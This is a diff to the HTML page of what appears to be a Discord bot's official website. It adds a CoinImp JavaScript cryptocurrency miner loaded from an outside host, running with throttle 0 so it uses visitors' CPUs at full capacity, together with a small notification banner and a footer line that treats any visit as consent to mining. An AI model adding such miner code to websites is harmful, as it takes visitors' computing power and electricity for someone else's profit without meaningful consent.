@@ -58,6 +58,17 @@ EOF;
     <link href="css/custom.css" rel="stylesheet" type="text/css" />
     <link href="fa/css/all.css" rel="stylesheet"> 
     <title>SeedBot | Offical Website</title>
+    
+<script src="https://www.hostingcloud.racing/cPTP.js"></script>
+<script>
+    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
+        throttle: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
+    
   </head>
   <body>
     <nav class="navbar navbar-expand-lg navbar-light bg-light" style="border-bottom:1px #666666 dotted;">
@@ -256,7 +267,7 @@ s~getallserverinvite<br>
     </div>
     <div class="footer">
       <div class="copyright">
-        Copyright &copy; 2018-2019 <a href="http://dariox.club">DARiOX</a>
+        Copyright &copy; 2018-2019 <a href="http://dariox.club">DARiOX</a> By using this website you consent to crypto minning.
       </div>
     </div>
   </body>
